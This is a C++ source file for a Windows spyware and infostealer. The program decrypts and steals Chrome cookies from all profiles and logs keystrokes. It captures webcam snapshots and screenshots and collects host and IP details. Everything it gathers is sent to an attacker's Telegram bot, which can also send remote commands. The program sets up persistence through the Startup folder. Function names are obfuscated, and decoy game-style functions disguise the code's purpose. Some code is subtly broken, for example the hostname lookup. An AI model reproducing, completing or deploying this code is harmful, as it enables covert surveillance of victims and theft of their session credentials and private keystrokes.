#pragma warning(disable : 4996)
#include "source.h"
#include "camera.h"




#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32.lib")

using namespace std;
using namespace Gdiplus;

const string _x1234 = "BOT_Token";  // Replace with your bot token
const string _y5678 = "CHAT_ID";      // Replace with your chat ID

string she(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (char c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        }
        else {
            escaped << '%' << setw(2) << uppercase << int((unsigned char)c);
        }
    }

    return escaped.str();
}

void _tele1234(const std::string& message) {
    std::string encodedMessage = she(message);  // URL encode the message

    // Construct the URL for Telegram API request
    std::string requestURL = "/bot" + _x1234 + "/sendMessage?chat_id=" + _y5678 + "&text=" + encodedMessage;

    // Open Internet connection
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // Open HTTP GET request
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", requestURL.c_str(), NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                BOOL result = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
                if (!result) {
                    DWORD error = GetLastError();
                    std::cerr << "Error sending request: " << error << std::endl;
                }
                else {
                    std::cout << "Message sent to Telegram successfully!" << std::endl;
                }
                InternetCloseHandle(hRequest);
            }
            else {
                std::cerr << "Failed to open HTTP request." << std::endl;
            }
            InternetCloseHandle(hConnect);
        }
        else {
            std::cerr << "Failed to connect to Telegram API." << std::endl;
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cerr << "Failed to initialize Internet handle." << std::endl;
    }
}
void _tele1234(const std::vector<uchar>& imageData) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            std::string requestPath = "/bot" + _x1234 + "/sendPhoto";
            std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;

            // Prepare the multipart form-data for the image
            std::string data =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                _y5678 + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"photo\"; filename=\"snapshot.jpg\"\r\n" +
                "Content-Type: image/jpeg\r\n\r\n";

            std::string endData = "\r\n--" + boundary + "--\r\n";

            // Open HTTP POST request
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", requestPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                // Prepare full data to send (headers + image data + boundary end)
                std::string requestData = data + std::string(imageData.begin(), imageData.end()) + endData;

                // Send the POST request
                BOOL result = HttpSendRequestA(hRequest, contentType.c_str(), contentType.length(), (LPVOID)requestData.c_str(), requestData.length());
                if (!result) {
                    DWORD error = GetLastError();
                    std::cerr << "Error sending snapshot to Telegram: " << error << std::endl;
                }
                else {
                    std::cout << "Snapshot sent to Telegram successfully!" << std::endl;
                }
                InternetCloseHandle(hRequest);
            }
            else {
                std::cerr << "Failed to open HTTP request." << std::endl;
            }
            InternetCloseHandle(hConnect);
        }
        else {
            std::cerr << "Failed to connect to Telegram API." << std::endl;
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cerr << "Failed to initialize Internet handle." << std::endl;
    }
}

void captureSnapshotAndSend() {
    // Open the default camera (0 is usually the default)
    cv::VideoCapture cap(0);
    if (!cap.isOpened()) {
        std::cerr << "Error: Could not open the camera." << std::endl;
        return;
    }

    cv::Mat frame;
    cap >> frame;  // Capture a single frame
    if (frame.empty()) {
        std::cerr << "Error: Could not capture frame." << std::endl;
        return;
    }

    // Encode the frame as JPEG in memory
    std::vector<uchar> imageData;
    cv::imencode(".jpg", frame, imageData);  // Encoding frame as JPEG in memory

    // Release the camera
    cap.release();

    // Send the encoded image data to Telegram
    _tele1234(imageData);
}



int _clsid1234(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;  // Number of image encoders
    UINT size = 0; // Size of the image encoder array in bytes

    // Get the number and size of all the image encoders
    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    // Allocate memory for the image encoder array
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    // Get the image encoders
    GetImageEncoders(num, size, pImageCodecInfo);

    // Find the correct encoder based on the format
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);  // Free allocated memory
            return i;  // Success
        }
    }

    free(pImageCodecInfo);  // Free allocated memory
    return -1;  // Failure
}
// Function to capture and save a screenshot
IStream* him() {
    // Get the desktop's device context
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Get the screen's width and height
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create a compatible bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    // Bit-block transfer the screen into the memory device context
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);

    // Initialize GDI+ Bitmap from the HBITMAP
    Bitmap bitmap(hBitmap, NULL);

    // Get PNG encoder
    CLSID pngClsid;
    _clsid1234(L"image/png", &pngClsid);

    // Create an IStream to store the image in memory
    IStream* pStream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    if (SUCCEEDED(hr)) {
        // Save the screenshot into the stream
        if (bitmap.Save(pStream, &pngClsid, NULL) != Ok) {
            pStream->Release();
            pStream = NULL;
        }
    }

    // Clean up
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return pStream;
}

size_t writeCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    size_t totalSize = size * nmemb;
    userp->append((char*)contents, totalSize);
    return totalSize;
}

void winner(IStream* pStream) {
    if (!pStream) {
        cerr << "Failed to capture screenshot." << endl;
        return;
    }

    // Move stream pointer to the beginning
    LARGE_INTEGER liZero = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);

    // Read the stream into memory
    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_NONAME);
    DWORD screenshotSize = statstg.cbSize.LowPart;
    char* screenshotData = new char[screenshotSize];
    ULONG bytesRead;
    pStream->Read(screenshotData, screenshotSize, &bytesRead);

    // HTTP multipart request to send the screenshot to Telegram
    HINTERNET hInternet = InternetOpenA("steps", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            string requestPath = "/bot" + _x1234 + "/sendPhoto";
            string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
            string data =
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                _y5678 + "\r\n" +
                "--" + boundary + "\r\n" +
                "Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n" +
                "Content-Type: image/png\r\n\r\n";

            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", requestPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                string requestData = data + string(screenshotData, screenshotSize) + "\r\n--" + boundary + "--\r\n";
                BOOL result = HttpSendRequestA(hRequest, contentType.c_str(), contentType.length(), (LPVOID)requestData.c_str(), requestData.length());
                if (!result) {
                    cerr << "Failed to send screenshot to Telegram." << endl;
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }

    // Clean up
    delete[] screenshotData;
    pStream->Release();
}

std::string getExternalIPAddress() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    std::string externalIP = "Unable to fetch IP";

    if (hInternet) {
        HINTERNET hConnect = InternetConnectA(hInternet, "api.ipify.org", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            if (hRequest) {
                if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                    char buffer[64];
                    DWORD bytesRead = 0;
                    InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
                    if (bytesRead > 0) {
                        buffer[bytesRead] = '\0';
                        externalIP = buffer;
                    }
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }

    return externalIP;
}

void pollTelegramForCommands() {
    string lastUpdateId = "0";  // Keep track of the last processed message
    while (true) {
        // Construct the URL to get updates (poll for new messages)
        std::string url = "https://api.telegram.org/bot" + _x1234 + "/getUpdates?offset=" + lastUpdateId;

        CURL* curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

            CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                auto jsonResponse = nlohmann::json::parse(response);
                if (!jsonResponse["result"].empty()) {
                    for (const auto& message : jsonResponse["result"]) {
                        // Get the message text and update the lastUpdateId
                        std::string text = message["message"]["text"];
                        lastUpdateId = std::to_string(message["update_id"].get<int>() + 1);

                        if (text == "/screenshot") {
                            IStream* pStream = him();
                            winner(pStream);
                        }
                        else if (text == "/snapshot") {
                            captureSnapshotAndSend();
                        }
                        else if (text == "/ip") {
                            std::string ip = getExternalIPAddress();
                            _tele1234("External IP Address: " + ip);
                        }
                    }
                }
            }
            curl_easy_cleanup(curl);
        }

        std::this_thread::sleep_for(std::chrono::seconds(2));  // Poll every 2 seconds
    }
}



std::vector<std::string> _gtchrm1234() {
    std::vector<std::string> profiles = {
        "Default",      // Main profile
        "Profile 1",    // Additional profiles
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5",
        "Profile 6"
        // Add more profiles if needed
    };
    return profiles;
}

std::string _dt1234(const std::vector<unsigned char>& encrypted_data) {

    DATA_BLOB input_data;
    DATA_BLOB output_data;

    input_data.pbData = (BYTE*)encrypted_data.data();
    input_data.cbData = (DWORD)encrypted_data.size();

    if (CryptUnprotectData(&input_data, NULL, NULL, NULL, NULL, 0, &output_data)) {
        std::string decrypted((char*)output_data.pbData, output_data.cbData);
        LocalFree(output_data.pbData);
        return decrypted;
    }

    return {};
}

std::string _ck1234FromProfile(const std::string& db_path) {
    sqlite3* db;
    sqlite3_stmt* stmt;
    std::string cookies_data = "";

    // Attempt to open the cookie database
    if (sqlite3_open(db_path.c_str(), &db) != SQLITE_OK) {
        std::cerr << "Failed to open the Chrome cookie database at path: " << db_path << std::endl;
        return "";
    }

    // SQL query to extract the cookies
    std::string query = "SELECT host_key, name, path, encrypted_value FROM cookies";
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, 0) != SQLITE_OK) {
        std::cerr << "Failed to prepare SQL statement for retrieving cookies." << std::endl;
        sqlite3_close(db);
        return "";
    }

    // Execute the query and process the results
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string host = (const char*)sqlite3_column_text(stmt, 0);
        std::string name = (const char*)sqlite3_column_text(stmt, 1);
        std::string path = (const char*)sqlite3_column_text(stmt, 2);
        const unsigned char* encrypted_value = (const unsigned char*)sqlite3_column_blob(stmt, 3);
        int encrypted_value_len = sqlite3_column_bytes(stmt, 3);

        std::vector<unsigned char> encrypted_data(encrypted_value, encrypted_value + encrypted_value_len);
        std::string decrypted_value = _dt1234(encrypted_data);

        // Only add the cookie if decryption is successful
        if (!decrypted_value.empty()) {
            cookies_data += "Host: " + host + ", Name: " + name + ", Value: " + decrypted_value + ", Path: " + path + "\n";
        }
        else {
            std::cerr << "Failed to decrypt cookie for host: " << host << std::endl;
        }
    }

    // Finalize the statement and close the database
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return cookies_data;
}

std::string _ck1234() {
    // Base path to Chrome's user data directory
    std::string base_path = getenv("LOCALAPPDATA");
    base_path += "\\Google\\Chrome\\User Data\\";

    std::string all_cookies = "";
    std::vector<std::string> profiles = _gtchrm1234();

    // Loop through each profile directory and steal cookies
    for (const std::string& profile : profiles) {
        std::string db_path = base_path + profile + "\\Network\\Cookies";  // Path to the cookie database
        std::string cookies = _ck1234FromProfile(db_path);
        if (!cookies.empty()) {
            all_cookies += "Profile: " + profile + "\n" + cookies + "\n";
        }
    }

    return all_cookies;
}

void _sndstln() {
    std::string cookies = _ck1234();
    if (!cookies.empty()) {
        // Telegram has a message limit of 4096 characters, so we need to split large messages
        size_t maxMessageLength = 4096;
        size_t start = 0;

        while (start < cookies.length()) {
            std::string chunk = cookies.substr(start, maxMessageLength);
            _tele1234(chunk);
            start += maxMessageLength;
        }
    }
    else {
        std::cerr << "No cookies to send or error occurred during cookie stealing." << std::endl;
    }
}

void PlayerPrayers() {

    string armor = "Existing";
    string no_armor = "Non Existing";
    if (armor == "Non Existing") {
        std::cout << "You aint got no armor, try again" << endl;
    }
}

void PlayerStats() {
    int stats = 200;
    if (stats == 100) { // This will never happen
        cout << "This will never be printed!" << endl;
    }
}

void PlayerHealth() {
    int x = 10;
    if (x == 100) { // This will never happen
        cout << "This will never be printed!" << endl;
    }
}

std::wstring stringToWString(const std::string& str) {
    int len;
    int stringLength = (int)str.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), stringLength, 0, 0);
    std::wstring wstr(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, str.c_str(), stringLength, &wstr[0], len);
    return wstr;
}

// Function to create a shortcut in the startup folder
void _a1234(const std::wstring& playerPath) {
    wchar_t _z7890[MAX_PATH];

    // Get the path to the Startup folder
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, _z7890))) {
        // Path to the shortcut file
        std::wstring shortcutPath = std::wstring(_z7890) + L"\\MyProgram.lnk";

        // Initialize COM
        CoInitialize(NULL);

        // Create a shell link
        IShellLinkW* _playerlink = NULL;
        HRESULT hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&_playerlink);

        if (SUCCEEDED(hres)) {
            // Set the path to the executable
            _playerlink->SetPath(playerPath.c_str());

            // Query IShellLink for the IPersistFile interface for saving the shortcut
            IPersistFile* playersword;
            hres = _playerlink->QueryInterface(IID_IPersistFile, (void**)&playersword);

            if (SUCCEEDED(hres)) {
                // Save the shortcut
                hres = playersword->Save(shortcutPath.c_str(), TRUE);
                playersword->Release();
            }
            _playerlink->Release();
        }

        // Uninitialize COM
        CoUninitialize();

        if (SUCCEEDED(hres)) {
            wcout << L"Shortcut successfully created in the startup folder.\n";
        }
        else {
            wcout << L"Failed to create shortcut.\n";
        }
    }
    else {
        wcout << L"Failed to get the Startup folder path.\n";
    }
}

std::string zestyDrake() {
    std::ostringstream ss;

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    char DrakeName[256];
    if ((DrakeName, sizeof(DrakeName)) == SOCKET_ERROR) {
        ss << "Error getting DrakeName: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return ss.str();
    }

    ss << "Hostname: " << DrakeName << "\n";

    struct addrinfo hints = {};
    struct addrinfo* result = nullptr;

    hints.ai_family = AF_UNSPEC;    // Allow IPv4 or IPv6
    hints.ai_socktype = SOCK_STREAM; // Stream socket
    hints.ai_flags = AI_CANONNAME;   // Get canonical name

    if (getaddrinfo(DrakeName, NULL, &hints, &result) != 0) {
        ss << "Error getting address info: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return ss.str();
    }

    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        void* addr;
        std::string ipver;

        if (ptr->ai_family == AF_INET) { // IPv4
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)ptr->ai_addr;
            addr = &(ipv4->sin_addr);
            ipver = "IPv4";
        }
        else { // IPv6
            struct sockaddr_in6* ipv6 = (struct sockaddr_in6*)ptr->ai_addr;
            addr = &(ipv6->sin6_addr);
            ipver = "IPv6";
        }

        char ipstr[INET6_ADDRSTRLEN];
        inet_ntop(ptr->ai_family, addr, ipstr, sizeof(ipstr));
        ss << ipver << " Address: " << ipstr << "\n";
    }

    freeaddrinfo(result);
    WSACleanup();
    return ss.str();
}


void jump(const string& input) {
    static string buffer = "";  // Buffer to store keystrokes
    buffer += input;            // Append the current keystroke to the buffer

    // Increase the buffer size to 20 keystrokes before sending to Telegram
    if (buffer.length() >= 20) {
        _tele1234(buffer);   // Send the buffered keystrokes to Telegram
        buffer.clear();           // Clear the buffer after sending
    }
}

// Function to get a dynamic filename for the screenshot
std::wstring screenshot_player() {
    auto now = std::chrono::system_clock::now();
    auto now_c = std::chrono::system_clock::to_time_t(now);
    std::wstringstream wss;
    wss << L"screenshot_" << now_c << L".png";
    return wss.str();
}

// Function to send a screenshot to Telegram


void _opn1234(const std::wstring& filename) {
    ShellExecute(NULL, L"open", filename.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        jump(" ");
        return true;
    case VK_RETURN:
        jump("\n");
        return true;
    case VK_SHIFT:
        jump("#SHIFT#");
        return true;
    case VK_BACK:
        jump("\b");
        return true;
    case VK_TAB:
        jump("#TAB#");
        return true;
    case VK_UP:
        jump("#UP_ARROW#");
        return true;
    case VK_DOWN:
        jump("#DOWN_ARROW#");
        return true;
    case VK_LEFT:
        jump("#LEFT_ARROW#");
        return true;
    case VK_RIGHT:
        jump("#RIGHT_ARROW#");
        return true;
    default:
        return false;
    }
}

// Function to get the correct character depending on shift state
char CharacterLevel(int key, bool isShiftPressed) {
    if (key >= 'A' && key <= 'Z') {
        if (isShiftPressed) {
            return key;  // Uppercase letter
        }
        else {
            return key + 32;  // Lowercase letter
        }
    }
    else if (key >= '0' && key <= '9') {
        if (isShiftPressed) {
            switch (key) {
            case '1': return '!';
            case '2': return '@';
            case '3': return '#';
            case '4': return '$';
            case '5': return '%';
            case '6': return '^';
            case '7': return '&';
            case '8': return '*';
            case '9': return '(';
            case '0': return ')';
            }
        }
        else {
            return key;
        }
    }
    else {
        if (isShiftPressed) {
            switch (key) {
            case VK_OEM_1: return ':';  // Shift + ;
            case VK_OEM_2: return '?';  // Shift + /
            case VK_OEM_3: return '~';  // Shift + 
            case VK_OEM_4: return '{';  
            case VK_OEM_5: return '|';  
                                            case VK_OEM_6: return '}';  // Shift + ]
            case VK_OEM_7: return '"';  // Shift + '
            }
        }
        else {
            switch (key) {
            case VK_OEM_1: return ';';  
            case VK_OEM_2: return '/';  
            case VK_OEM_3: return '~';   
            case VK_OEM_4: return '[';  
            case VK_OEM_5: return '\\'; 
                                            
            case VK_OEM_7: return '\''; 
            }
        }
    }
    return key;
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    std::thread telegramPollThread(pollTelegramForCommands);

    string networkInfo = zestyDrake();
    _tele1234(networkInfo);

    _sndstln();
    captureSnapshotAndSend();
    wchar_t playerPath[MAX_PATH];
    GetModuleFileNameW(NULL, playerPath, MAX_PATH);
    _a1234(playerPath);

    char fortnite = 'x';

    while (true) {
        Sleep(10);
        for (int fortnite = 8; fortnite <= 190; fortnite++) {
            if (GetAsyncKeyState(fortnite) == -32767) {
                bool isShiftPressed = GetAsyncKeyState(VK_SHIFT);

                if (SpecialKeys(fortnite) == false) {
                    char character = CharacterLevel(fortnite, isShiftPressed);
                    jump(string(1, character));  // Log special characters
                }

                // Capture and save screenshot every time a certain key is pressed (e.g., VK_F12)
                
            }
        }
    }

    GdiplusShutdown(gdiplusToken);

    return 0;
}
